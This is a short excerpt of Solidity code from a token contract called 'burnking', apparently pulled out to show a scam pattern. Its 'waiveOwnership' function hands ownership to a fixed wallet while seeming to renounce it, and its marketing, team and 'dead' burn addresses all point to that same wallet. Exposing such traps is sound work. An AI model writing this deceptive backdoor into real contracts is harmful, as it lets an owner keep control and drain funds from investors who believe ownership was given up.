...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x770dCfa19D647eb0d84BEF67d5bd2ccC9040f897));
        _owner = address(0x770dCfa19D647eb0d84BEF67d5bd2ccC9040f897);
    }
...
contract burnking is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x770dCfa19D647eb0d84BEF67d5bd2ccC9040f897);
    address payable public teamWalletAddress = payable(0x770dCfa19D647eb0d84BEF67d5bd2ccC9040f897);
    address public immutable deadAddress = 0x770dCfa19D647eb0d84BEF67d5bd2ccC9040f897;
